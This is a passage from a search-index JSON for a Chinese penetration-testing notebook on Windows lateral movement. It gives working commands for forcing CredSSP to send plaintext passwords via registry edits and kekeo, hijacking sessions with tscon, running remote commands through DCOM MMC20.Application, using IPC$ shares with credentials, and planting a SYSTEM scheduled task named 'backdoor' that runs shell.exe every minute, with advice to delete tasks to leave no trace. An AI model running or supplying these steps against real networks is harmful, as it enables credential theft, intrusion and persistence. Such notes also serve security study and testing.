HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\u3002","title":"credssp \u5bfc\u51fa\u7528\u6237\u660e\u6587\u5bc6\u7801"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_15","text":"\u90a3\u4e48\u8fd9\u6837\u770b\uff0c\u8fd9\u4e2a\u653b\u51fb\u6d41\u7a0b\u5c31\u5f88\u81ea\u7136\u4e86\u3002 \u6211\u4eec\u8981\u83b7\u5f97\u4e24\u53f0\u673a\u5668\uff0c\u4e00\u53f0\u673a\u5668\u5f53\u4f5c\u8fdc\u7a0b\u684c\u9762\u7684\u670d\u52a1\u5668\uff0c\u4e00\u53f0\u5f53\u4f5c\u8fdc\u7a0b\u684c\u9762\u7684\u5ba2\u6237\u7aef\u3002 \u5728\u5ba2\u6237\u7aef\u4e0a\u914d\u7f6e\u7ec4\u7b56\u7565\uff08CREDSSP\uff09\uff0c\u4f7f\u5176\u5728\u8fdc\u7a0b\u684c\u9762\u8eab\u4efd\u9a8c\u8bc1\u65f6\u53d1\u9001\u660e\u6587\u5bc6\u7801\u3002 \u7136\u540e\u5f00\u59cb\u8fdc\u7a0b\u684c\u9762\u9a8c\u8bc1\uff0c\u5728\u670d\u52a1\u5668\u4e0a\u83b7\u5f97\u5ba2\u6237\u7aef\u53d1\u6765\u7684\u660e\u6587\u5bc6\u7801.","title":"\u653b\u51fb\u539f\u7406"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_16","text":"1.\u901a\u8fc7\u4fee\u6539\u6ce8\u518c\u8868\uff0c\u6539\u53d8\u7ec4\u7b56\u7565\u8eab\u4efd\u9a8c\u8bc1\u7684\u51ed\u636e\u7b56\u7565(\u9009\u4e00\u4e2a\uff09\uff0c\u8fd9\u4e00\u6b65\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\uff0c\u672c\u5730\u6216\u57df\u7ba1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v AllowDefaultCredentials /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v AllowDefCredentialsWhenNTLMOnly /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v ConcatenateDefaults_AllowDefault /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation /v ConcatenateDefaults_AllowDefNTLMOnly /t REG_DWORD /d 1 reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefaultCredentials /v 1 /t REG_SZ /d * reg add hklm\\SOFTWARE\\Policies\\Microsoft\\Windows\\CredentialsDelegation\\AllowDefCredentialsWhenNTLMOnly /v 1 /t REG_SZ /d * \u4e00\u80a1\u8111\u8bbe\u7f6e\u597d\u5c31\u5b8c\u4e8b\u4e86\u3002\u3002\uff08\u7528\u6237\u9700\u91cd\u65b0\u767b\u9646\u624d\u751f\u6548\uff09 \u7136\u540e\u5f00\u59cb\u83b7\u53d6\u5bc6\u7801 \u6211\u4eec\u521a\u521a\u63d0\u5230\u9700\u8981\u4e24\u53f0\u7535\u8111\u624d\u80fd\u83b7\u53d6\u5bc6\u7801\uff0c\u5176\u5b9e\u90a3\u53ea\u662f\u4e00\u4e2a\u6a21\u578b\uff0c\u4e00\u4e2a\u673a\u5668\u65e2\u53ef\u4ee5\u5f53\u4f5c\u5ba2\u6237\u7aef\u53c8\u53ef\u4ee5\u5f53\u4f5c\u670d\u52a1\u7aef\u7684\u3002 \u6211\u4eec\u7528kekeo\u5b9e\u73b0\u653b\u51fb\uff08\u672c\u673a\u5411\u672c\u673a\u83b7\u53d6\u5bc6\u7801\u65f6\uff0c\u666e\u901a\u7528\u6237\u5373\u53ef\u5b8c\u6210\u4ee5\u4e0b\u64cd\u4f5c\uff09 tsssp::server \u5f00\u542f\u670d\u52a1\u7aef tsssp::client /target:... \u5f00\u542f\u5ba2\u6237\u7aef\uff0c\u8fd9\u91cc\u7684target\u968f\u4fbf\u586b \u90a3\u4e48\u518d\u56de\u5230\u9700\u8981\u4e24\u4e2a\u673a\u5668\uff0c\u4e00\u4e2a\u5f53\u670d\u52a1\u7aef\u4e00\u4e2a\u5f53\u5ba2\u6237\u7aef\u7684\u60c5\u51b5\u5427\u3002 \u670d\u52a1\u7aef\u5efa\u7acb: tsssp::server \u9700\u8981SYSTEM\u6743\u9650 \u5ba2\u6237\u7aef\u94fe\u63a5: tsssp::client /target:\u670d\u52a1\u7aef\u7684SPN\uff08\u4e00\u822c\u91c7\u7528TERMSRV\u670d\u52a1\uff09 /pipe: \\\u670d\u52a1\u7aef\u57df\u540d\\pipe\\kekeo_tsssp_endpoint \u666e\u901a\u7528\u6237\u6743\u9650\u5373\u53ef","title":"\u5b9e\u64cd"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#tscon","text":"\u82e5\u4e00\u4e2a\u673a\u5668\u4e0a\u6709\u591a\u4e2a\u7528\u6237\u767b\u5f55\uff0c\u5219\u5728\u4efb\u52a1\u7ba1\u7406\u5668\u53ef\u4ee5\u770b\u89c1\u5982\u4e0b\u573a\u9762 \u5176\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u5176\u4ed6\u7528\u6237\u9009\u62e9\u94fe\u63a5\uff0c\u8f93\u5165\u5176\u5bc6\u7801\u540e\u5c31\u80fd\u8fdb\u5165\u5176\u684c\u9762 \u4f46\u662f\u5bf9\u4e8esystem\u7528\u6237\u6765\u8bf4\uff0c\u8981\u94fe\u63a5\u5230\u5176\u4ed6\u7528\u6237\u662f\u4e0d\u9700\u8981\u8f93\u5165\u5bc6\u7801\u7684\uff0c\u53ef\u4ee5\u76f4\u63a5\u8fde\u63a5\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7system\u6743\u9650\u83b7\u53d6\u767b\u5f55\u5728\u5f53\u524d\u673a\u5668\u4e0a\u7684\u57df\u7528\u6237\u6743\u9650\u3002 \u6bd4\u5982\u4e0a\u56fe\u4e2d\u7684administrator\u662f\u57df\u7ba1\uff0c\u6211\u6709\u5f53\u524d\u673a\u5668\u7684system\u6743\u9650\uff0c\u90a3\u4e48\u6211\u53ef\u4ee5\u76f4\u63a5\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b8c\u6210\u7528\u6237\u6743\u9650\u83b7\u5f97\u3002 query user \u83b7\u5f97administrator\u7528\u6237\u7684id \u53ef\u4ee5\u53d1\u73b0admin\u7684id\u662f2\uff0c\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u7528tscon\u8fd9\u4e2awindows\u81ea\u5e26\u7684\u547d\u4ee4\u884c\u5de5\u5177\u5b8c\u6210\u6743\u9650\u83b7\u5f97\u3002 cmd /k tscon 2 /dest:console \u6267\u884c\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6211\u4eec\u8df3\u8f6c\u5230\u4e86admin\u7684\u684c\u9762","title":"tscon\u6a2a\u5411"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#comdcom","text":"\u53c2\u8003: https://www.freebuf.com/articles/network/256372.html","title":"\u5229\u7528COM/DCOM\u5bf9\u8c61"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_17","text":"DCOM\u662fCOM\u7684\u6269\u5c55\uff0c\u5141\u8bb8\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\u5316\u548c\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u4e0a\u7684COM\u5bf9\u8c61\u3002 \u8fd9\u91cc\u7b80\u8981\u8bf4\u4e00\u4e0b\u51e0\u4e2a\u6709\u5173COM\u7684\u6982\u5ff5 CLSID\uff1a\u53c8\u53ebCLASSID \u4e00\u4e2aCOM\u7c7b\u7684\u552f\u4e00\u6807\u8bc6\u7b26\uff0c\u6bcf\u4e00\u4e2aWindows\u6ce8\u518c\u7c7b\u4e0e\u4e00\u4e2aCLSID\u76f8\u5173\u8054\u3002\u957f\u5f97\u50cf\u8fd9\u6837 {20D04FE0-3AEA-1069-A2D8-08002B30309D} ProgID\uff1a\u5176\u53ef\u88ab\u7528\u4f5c\u5bf9\u7528\u6237\u66f4\u53cb\u597d\u7684\u66ff\u4ee3\u7684\u4e00\u4e2aCLSID\uff0c\u6bd4\u5982MMC20.APPLICATION.1\u5c31\u662f\u4e00\u4e2aProgID\u3002ProgID\u4e0d\u80fd\u4fdd\u8bc1\u662f\u552f\u4e00\u7684\uff0c\u5e76\u975e\u6bcf\u4e2a\u7c7b\u90fd\u4e0eProgID\u76f8\u5173\u8054 Appid: \u4e3a\u4e86\u4fdd\u8bc1COM\u5bf9\u8c61\u80fd\u88ab\u987a\u5229\u7684\u8fdc\u7a0b\u8c03\u7528\uff08\u5373\u4e3a\u4e86\u4f7fDCOM\u53ef\u8bbf\u95eeCOM\u5bf9\u8c61\uff09\uff0c\u9700\u8981\u628aAPPID\u4e0e\u8be5\u7c7b\u7684CLSID\u76f8\u5173\u8054\uff0c\u4e14AppID\u9700\u8bbe\u7f6e\u6743\u9650\u6765\u89c4\u5212\u54ea\u4e9b\u5ba2\u6237\u7aef\u80fd\u591f\u8bbf\u95ee \u6211\u4eec\u53ef\u4ee5\u901a\u8fc7powershell\u6267\u884cget-CimInstance \u6765\u5217\u51fa\u672c\u5730COM\u7a0b\u5e8f\u5217\u8868 \u8fdc\u7a0bDCOM\u5bf9\u8c61\u5b9e\u4f8b\u5316\u7684\u6d41\u7a0b: \u5ba2\u6237\u7aef\u4ece\u8fdc\u7a0b\u8ba1\u7b97\u673a\u8bf7\u6c42\u5b9e\u4f8b\u5316\u7531CLSID\u8868\u793a\u7684\u5bf9\u8c61\u3002\u5982\u679c\u5ba2\u6237\u7aef\u4f7f\u7528ProgID\u5219\u5148\u5c06\u5176\u672c\u5730\u89e3\u6790\u4e3aCLSID\u3002 \u8fdc\u7a0b\u8ba1\u7b97\u673a\u68c0\u67e5\u662f\u5426\u5b58\u5728\u7531\u8be5CLSID\u6240\u5173\u8054\u7684AppID\uff0c\u5e76\u9a8c\u8bc1\u5ba2\u6237\u7aef\u7684\u6743\u9650\u3002 DCOMLaunch\u670d\u52a1\u5c06\u521b\u5efa\u6240\u8bf7\u6c42\u7684\u7c7b\u7684\u5b9e\u4f8b\uff0c\u901a\u5e38\u662f\u901a\u8fc7\u8fd0\u884cLocalServer32\u5b50\u9879\u7684\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u6216\u8005\u901a\u8fc7\u521b\u5efaDllHost\u8fdb\u7a0b\u6765\u627f\u8f7dInProcServer32\u5b50\u9879\u5f15\u7528\u7684dll\u3002 \u5ba2\u6237\u7aef\u5e94\u7528\u7a0b\u5e8f\u548c\u670d\u52a1\u5668\u8fdb\u7a0b\u95f4\u5efa\u7acb\u901a\u4fe1\uff0c\u5ba2\u6237\u7aef\u4fbf\u53ef\u4ee5\u8bbf\u95ee\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u3002","title":"\u524d\u8a00"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#mmc20application1","text":"\u4e2d\u6587\u540d\u4e3a\uff1a Microsoft\u7ba1\u7406\u63a7\u5236\u53f0\uff08MMC\uff092.0\u5305\u62ec\u811a\u672c\u5bf9\u8c61\u6a21\u578b\u3002 \u6211\u4eec\u4e00\u6b65\u6b65\u62bd\u4e1d\u5265\u8327\u8ddf\u8e2a\u4e00\u4e0b\u8fd9\u4e2a\u5bf9\u8c61\u7684\u5229\u7528\u70b9\uff0c\u9700\u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f\u8c03\u7528\u8be5\u5bf9\u8c61\u5fc5\u987b\u8981\u6709\u7ba1\u7406\u5458\u6743\u9650\u3002 \u5982\u4e0a\u56fe\uff0c\u6211\u4eec\u5148\u5217\u51fa\u5728MMC20.APPLICATION\u4e2d\u7684\u6a21\u5757\uff0c\u7136\u540e\u7ee7\u7eed\u5217\u51fa\u5176\u4e2dDocument\u4e2d\u7684\u5c5e\u6027\uff0c\u518d\u7ee7\u7eed\u5217\u51faDocument.ActiveView\u4e2d\u7684\u5c5e\u6027\u3002\u53ef\u4ee5\u53d1\u73b0\u4e00\u4e2a\u540d\u4e3aExecuteShellCommand\u7684\u65b9\u6cd5\uff0c\u5149\u662f\u542c\u540d\u5b57\u5c31\u77e5\u9053\u662f\u53ef\u4ee5\u6267\u884cshell\u547d\u4ee4\u7684\u65b9\u6cd5\u4e86\u3002\u5230\u5fae\u8f6f\u6587\u6863\u67e5\u4e00\u67e5\u8fd9\u4e2a\u65b9\u6cd5\uff0c\u83b7\u5f97\u4e86\u4ee5\u4e0b\u4fe1\u606f\u3002 ExecuteShellCommand\uff08[\u547d\u4ee4][\u76ee\u5f55][\u53c1\u6570][\u7a97\u53e3\u72b6\u6001]\uff09 \u547d\u4ee4 \u4e00\u4e2a\u503c\uff0c\u6307\u5b9a\u8981\u6267\u884c\u7684\u547d\u4ee4\u3002\u53ef\u4ee5\u6307\u5b9a\u6807\u51c6\u8def\u5f84\u3002Command\u4e2d\u5305\u542b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\uff08\u4f8b\u5982\u201c\uff05windir\uff05\u201d\uff09\u90fd\u5c06\u88ab\u6269\u5c55\u3002 \u76ee\u5f55 \u4e00\u4e2a\u503c\uff0c\u7528\u4e8e\u6307\u5b9a\u5de5\u4f5c\u76ee\u5f55\u7684\u540d\u79f0\u3002Directory\u4e2d\u5305\u542b\u7684\u6240\u6709\u73af\u5883\u53d8\u91cf\u90fd\u5c06\u88ab\u6269\u5c55\u3002\u5982\u679c\u201c\u76ee\u5f55\u201d\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u5c06\u5f53\u524d\u76ee\u5f55\u7528\u4f5c\u5de5\u4f5c\u76ee\u5f55\u3002 \u53c2\u6570 \u4e00\u4e2a\u6307\u5b9aCommand\u8981\u4f7f\u7528\u7684\u53c2\u6570\uff08\u5982\u679c\u6709\uff09\u7684\u503c\uff1b\u53c2\u6570\u5fc5\u987b\u7528\u7a7a\u683c\u5206\u9694\u3002\u4f8b\u5982\uff0c\u5c06\u53c2\u6570\u6307\u5b9a\u4e3a\u201c Param1 Param2\u201d\u4f1a\u5bfc\u81f4Command\u63a5\u6536Param1\u548cParam2\u4f5c\u4e3a\u53c2\u6570\u3002\u5982\u679c\u8981\u6c42\u5355\u4e2a\u53c2\u6570\u7528\u53cc\u5f15\u53f7\u5f15\u8d77\u6765\uff0c\u8bf7\u4f7f\u7528\u9002\u5408\u60a8\u7684\u7f16\u7a0b\u8bed\u8a00\u7684\u6280\u672f\u3002\u4f8b\u5982\uff0c\u5728Microsoft Visual Basic\u4e2d\uff0c\u5c06\u53c2\u6570\u6307\u5b9a\u4e3a\u201c Param1\u201d\u201c\u8fd9\u662fParam2\u201d\u201c\u201d\u5bfc\u81f4\u547d\u4ee4\u63a5\u6536\u5230\u53c2\u65701\u548c\u201c\u8fd9\u662fParam2\u201d\u3002 \u7a97\u53e3\u72b6\u6001 \u4e00\u4e2a\u6307\u5b9a\u7a97\u53e3\u72b6\u6001\u7684\u503c\u3002\u8be5\u503c\u53ef\u4ee5\u662f\u4ee5\u4e0b\u5b57\u7b26\u4e32\u503c\u4e4b\u4e00\uff0c\u4e5f\u53ef\u4ee5\u662f\u7a7a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u4e3a\u7a7a\u5b57\u7b26\u4e32\uff0c\u5219\u9ed8\u8ba4\u4e3a\u201c\u5df2\u6062\u590d\u201d\u3002 \u201cMaximized\u201d \u8be5\u547d\u4ee4\u5728\u6700\u5927\u5316\u7684\u7a97\u53e3\u4e2d\u6267\u884c\u3002 \u201cMinimized\u201d \u8be5\u547d\u4ee4\u5728\u6700\u5c0f\u5316\u7684\u7a97\u53e3\u4e2d\u6267\u884c\u3002 \u201cRestored\u201d \u8be5\u547d\u4ee4\u5728\u5df2\u6062\u590d\u6216\u6b63\u5e38\u7684\u7a97\u53e3\u4e2d\u6267\u884c\u3002\u6ce8\u610f\uff1a\u8fd9\u91cc\u4f1a\u5f39\u4e2a\u9ed1\u6846\u6846 \u8fd4\u56de\u503c \u6b64\u65b9\u6cd5\u4e0d\u8fd4\u56de\u503c\u3002 \u4e8e\u662f\u4e4e\uff0c\u6211\u4eec\u5c31\u80fd\u7406\u6240\u5e94\u5f53\u7684\u60f3\u5230\u8fd9\u4e2a\u4e1c\u897f\u53ef\u4ee5\u88ab\u7528\u4e8e\u672c\u5730\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u5c31\u50cf\u8fd9\u6837 [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application')).Document.ActiveView.Executeshellcommand('cmd.exe',$null,'/c calc.exe','Restored') \u6211\u4eec\u8fdb\u4e00\u6b65\u53d1\u6398\u5176\u6a2a\u5411\u79fb\u52a8\u7684\u80fd\u529b \u6211\u4eec\u77e5\u9053DCOM\u5177\u6709\u901a\u8fc7\u7f51\u7edc\u4e0e\u5bf9\u8c61\u8fdb\u884c\u4ea4\u4e92\u7684\u80fd\u529b\uff0c\u5728\u6211\u4eec\u662f\u7ba1\u7406\u5458\u7684\u524d\u63d0\u4e0b\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528GetTypeFromProgID()\u4e0epowershell\u8fdb\u884cDCOM\u8fdc\u7a0b\u4ea4\u4e92\u3002 GetTypeFromProgID(\"COM\",\"\u8fdc\u7a0bip\") \u5373\u53ef\u6307\u5b9a\u4e0e\u54ea\u4e00\u4e2a\u8fdc\u7a0bIP\u8fdb\u884c\u4ea4\u4e92\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u628apayload\u6539\u9020\u6210\u8fd9\u6837\uff0c\u8fdb\u800c\u53ef\u4ee5\u5728\u5176\u4ed6\u673a\u5668\u4e0a\u8fdb\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u4ece\u800c\u8fbe\u5230\u6a2a\u5411\u79fb\u52a8\u7684\u76ee\u7684 [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application' \uff0c'\u8fdc\u7a0bip')).Document.ActiveView.Executeshellcommand('cmd.exe',$null,'/c calc.exe','Restored')","title":"MMC20.APPLICATION.1"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ipc","text":"","title":"ipc"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ipc_1","text":"IPC$\u662f\u4e3a\u4e86\u8ba9\u8fdb\u7a0b\u95f4\u901a\u4fe1\u800c\u5f00\u653e\u7684\u547d\u540d\u7ba1\u9053\uff0c\u901a\u8fc7\u63d0\u4f9b\u53ef\u4fe1\u4efb\u7684\u7528\u6237\u540d\u548c\u53e3\u4ee4\uff0c\u5373\u80fd\u5efa\u7acb\u94fe\u63a5\uff0c\u8fbe\u5230\u8bbf\u95ee\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u76ee\u7684\u3002ipc\u5171\u4eab\u8fde\u63a5\u6210\u529f\u540e\u4e00\u822c\u80fd\u5171\u4eab\u6240\u6709\u5171\u4eab\u76d8\u7b26\u3002\uff08\u4e5f\u5c31\u662fIPC\u8fde\u63a5\u540e\u53ef\u4ee5\u8fdc\u7a0b\u5171\u4eabC$,D\\$\u7b49\uff09 \u5229\u7528\u8fd9\u4e2a\u94fe\u63a5\u4e0d\u4ec5\u53ef\u4ee5\u8bbf\u95ee\u76ee\u6807\u673a\u5668\u4e2d\u7684\u6587\u4ef6\uff0c\u8fdb\u884c\u4e0a\u4f20\u4e0b\u8f7d\u7b49\u64cd\u4f5c\uff0c\u8fd8\u80fd\u5728\u76ee\u6807\u673a\u5668\u4e0a\u6267\u884c\u90e8\u5206\u547d\u4ee4\u3002 net use \\\\ip\\ipc$ \"password\" /user:username \u5982\u679c\u8d26\u6237\u548c\u53e3\u4ee4\u6b63\u786e\uff0c\u5c31\u5efa\u7acb\u597d\u4e86\u94fe\u63a5\u3002 \u5efa\u7acb\u597d\u94fe\u63a5\u540e\u5c31\u80fd\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 dir \\\\192.168.183.130\\c$ \u5217\u51faC\u76d8 copy C:\\Users\\douser\\Desktop\\whoami.txt \\\\192.168.183.130\\c$ \u4e0a\u4f20\u6587\u4ef6 tasklist /S 192.168.183.130 /U administrator /P liu78963 \u5217\u51fa\u67d0IP\u4e0a\u7684\u8fdb\u7a0b\u4fe1\u606f\uff0c/U\u6307\u5b9a\u54ea\u4e2a\u7528\u6237\u6267\u884c\u8be5\u547d\u4ee4\uff0c/p\u6307\u5b9a\u8be5\u7528\u6237\u5bc6\u7801 net use \\\\IP /del /y \u5220\u9664\u94fe\u63a5 net use \u67e5\u770b\u5df2\u5efa\u7acb\u7684ipc\u94fe\u63a5","title":"ipc\u7b80\u4ecb"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#ipc_2","text":"","title":"\u5229\u7528ipc\u6a2a\u5411\u79fb\u52a8"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#at","text":"at \\\\192.168.183.130 17:05:00 cmd.exe /c \"<\u547d\u4ee4>\" at \\\\192.168.183.130 17:05:00 powershell.exe -c \"<\u547d\u4ee4>\" \u5173\u4e8e\u65f6\u95f4\u7684\u83b7\u5f97\uff0c\u53ef\u4ee5\u4f7f\u7528 net time \\\\IP \u83b7\u5f97\u3002 \u8ba1\u5212\u4efb\u52a1\u6267\u884c\u540e\u9700\u8981\u5220\u9664\uff0c\u4e0d\u7559\u75d5\u8ff9 at \\\\192.168.183.130 1 /delete //1\u4e3a\u4efb\u52a1\u7684ID \u5173\u4e8e\u6b64\u65b9\u6cd5\u6211\u4eec\u53ef\u4ee5\u5148\u901a\u8fc7copy\u4e0a\u4f20\u6076\u610f\u6587\u4ef6\u7136\u540e\u901a\u8fc7at\u6765\u6267\u884c\u5b83\uff0c\u6216\u8005\u76f4\u63a5\u901a\u8fc7powershell\u8fdc\u7a0b\u52a0\u8f7d\u4e0a\u7ebf\u7b49","title":"at"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#schtasks","text":"at\u547d\u4ee4\u5df2\u7ecf\u88abWindows Vista\u3001Windows Server 2008\u53ca\u4e4b\u540e\u7248\u672c\u7684\u64cd\u4f5c\u7cfb\u7edf\u5e9f\u5f03\u4e86\uff0c\u53d6\u800c\u4ee3\u4e4b\u7684\u662fschtasks\u547d\u4ee4\u3002 \u6a2a\u5411\u79fb\u52a8\u7684\u5927\u81f4\u601d\u8def\u4e0eat\u5dee\u4e0d\u591a\u3002 \u5728\u76ee\u6807\u4e3b\u673a\u4e0a\u521b\u5efa\u4e00\u4e2a\u540d\u79f0\u4e3a\u201cbackdoor\u201d\u7684\u8ba1\u5212\u4efb\u52a1\u3002\u8be5\u8ba1\u5212\u4efb\u52a1\u6bcf\u5206\u949f\u542f\u52a8\u4e00\u6b21\uff0c\u542f\u52a8\u7a0b\u5e8f\u4e3a\u6211\u4eec\u4e4b\u524d\u5230C\u76d8\u4e0b\u7684shell.exe\uff0c\u542f\u52a8\u6743\u9650\u4e3asystem\u3002 schtasks /create /s 192.168.183.130 /tn backdoor /sc minute /mo 1 /tr c:\\shell.exe /ru system /f \u4f46\u4e5f\u6709\u4e9b\u65f6\u5019\uff0c\u7531\u4e8e\u5f53\u524d\u6743\u9650\u6216\u7ec4\u7b56\u7565\u8bbe\u7f6e\u7b49\u539f\u56e0\uff0c\u8be5schtasks\u65b9\u6cd5\u8fdc\u7a0b\u521b\u5efa\u8ba1\u5212\u4efb\u52a1\u53ef\u80fd\u4f1a\u62a5\u9519\u62d2\u7edd\u8bbf\u95ee,\u9047\u5230\u8fd9\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u53ef\u4ee5\u52a0\u4e0a/u\u548c/p\u53c2\u6570\u5206\u522b\u8bbe\u7f6e\u9ad8\u6743\u9650\u7528\u6237\u540d\u548c\u5bc6\u7801 schtasks /create /s 192.168.183.130 /u username /p password /tn backdoor /sc minute /mo 1 /tr c:\\shell.exe /ru system /f 